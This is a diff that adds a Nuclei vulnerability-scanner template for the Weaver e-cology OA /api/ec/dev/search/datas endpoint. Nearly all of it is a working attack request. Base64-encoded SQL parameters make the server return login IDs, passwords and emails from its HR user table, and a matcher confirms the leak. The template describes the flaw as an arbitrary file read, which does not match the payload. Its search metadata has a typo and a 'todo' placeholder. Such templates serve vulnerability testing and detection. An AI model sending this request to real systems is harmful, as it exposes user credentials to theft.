@@ -1,0 +1,28 @@
+id: weaver-ecology-api-ec-dev-search-datas-fileread
+
+info:
+  name: weaver-api-ec-dev-search-datas-fileread
+  author: leadlife
+  severity: high
+  description: 泛微OA /api/ec/dev/search/datas 任意文件读取漏洞
+  metadata:
+    verified: true
+    fofa-qeury: app="todo"
+  tags: weaver,fileread,oa,ecology
+
+http:
+  - raw:
+      - |
+        POST /api/ec/dev/search/datas HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 215
+
+        type=&sqlParams={"tFields":"Kg==","tFrom":"SHJtUmVzb3VyY2U=","tOrder":"aWQ=","tWhere":""}&columns=[{"dataIndex":"loginid"},{"dataIndex":"password"},{"dataIndex":"email"},{"dataIndex":"id"}]&sumCloumns=&min=0&max=100
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200"
+          - "contains_all(body_1,'passwordspan','password','datas')"
+        condition: and
